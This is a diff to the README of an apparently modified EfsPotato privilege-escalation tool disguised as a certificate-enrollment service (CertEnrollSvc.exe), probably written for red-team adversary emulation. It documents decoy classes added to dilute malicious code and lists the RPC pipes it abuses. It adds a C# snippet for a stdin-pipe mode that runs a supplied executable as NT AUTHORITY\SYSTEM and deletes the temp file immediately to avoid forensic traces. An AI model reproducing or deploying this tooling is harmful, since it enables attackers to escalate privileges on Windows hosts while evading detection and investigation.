@@ -112,6 +112,25 @@ Added three classes to dilute the ratio of malicious to benign code:
 - `EnrollmentLogger` — file-based logger writing to `%ProgramData%\Microsoft\CertificateServices\enrollment.log`
 - `RegistryHelper` — reads `SOFTWARE\Microsoft\Cryptography\AutoEnrollment` registry keys
 
+#### 8. Stdin PE delivery — ephemeral temp file (zero disk artifact)
+
+If stdin is a pipe, `Main()` reads a PE from it (`[4-byte LE size][PE bytes]`), writes to `Path.GetTempFileName()`, calls `CreateProcessAsUser(SYSTEM, tempFile)`, then **immediately deletes the temp file** before waiting on the process. The PE image is already mapped by the kernel when `CreateProcessAsUser` returns, so deletion succeeds with no impact on execution.
+
+```csharp
+if (GetFileType(GetStdHandle(STD_INPUT_HANDLE)) == FILE_TYPE_PIPE)
+{
+    // ReadFull(stdin, hdr=4 bytes) → peSize = BitConverter.ToInt32(hdr,0)
+    // ReadFull(stdin, peBytes, peSize)
+    tempFilePath = Path.GetTempFileName();
+    File.WriteAllBytes(tempFilePath, peBytes);
+    targetCmdLine = tempFilePath;
+}
+// After CreateProcessAsUser:
+try { File.Delete(tempFilePath); } catch { }
+```
+
+Backward compatible: if stdin is not a pipe, falls through to `args[0]` as before (Mode 2).
+
 ---
 
 ## Build
@@ -126,14 +145,18 @@ csc /target:exe /platform:x64 /out:EfsPotato.exe EfsPotato.cs -nowarn:1691,618
 
 ## Usage
 
+### Mode 1 — stdin pipe
+
+If stdin is a pipe, reads PE from it, writes to `GetTempFileName()`, calls `CreateProcessAsUser(SYSTEM, tempFile)`, then immediately deletes the temp file.
+
+Stdin format: `[4-byte LE DWORD size][PE bytes]`
+
+### Mode 2 — command-line argument
+
 ```
-CertEnrollSvc.exe <cmd> [pipe]
+CertEnrollSvc.exe <target_cmd> [pipe]
     pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
 ```
 
-**In this emulation:**
-```
-C:\Windows\Temp\CertEnrollSvc.exe C:\ProgramData\CertEnrollAgent.exe
-```
-Spawns `CertEnrollAgent.exe` (CWLHerpaderping) as `NT AUTHORITY\SYSTEM`.
+Spawns `<target_cmd>` as `NT AUTHORITY\SYSTEM`.
 
